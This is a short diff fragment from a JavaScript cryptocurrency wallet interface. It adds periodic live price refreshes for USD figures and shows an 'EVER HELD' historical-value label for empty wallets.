+        const histUsd = +(item.totalEverReceivedEth * (uiPrice('eth') || 0) + tokenUsdTotal).toFixed(2);
         if (!item.balanceUsd || Number(item.balanceUsd) === 0) {
           item.historicalLabel = `EVER HELD ${item.totalEverReceivedEth.toFixed(6)} ETH${tokSummary ? ' + ' + tokSummary : ''} (~$${histUsd.toFixed(2)} • ${item.historicalTx} TX)`;
         }
@@ -5200,6 +5389,11 @@
   }
 
   installWorkspaceChrome();
+
+  // Real market quotes drive every USD figure. If this never succeeds the UI
+  // shows coin amounts only — it never falls back to a hardcoded rate.
+  refreshLivePrices().then(renderPriceStatus);
+  setInterval(() => refreshLivePrices().then(renderPriceStatus), 180000);
 
   loadFundedVault(true);
   setInterval(() => loadFundedVault(false), 20000);
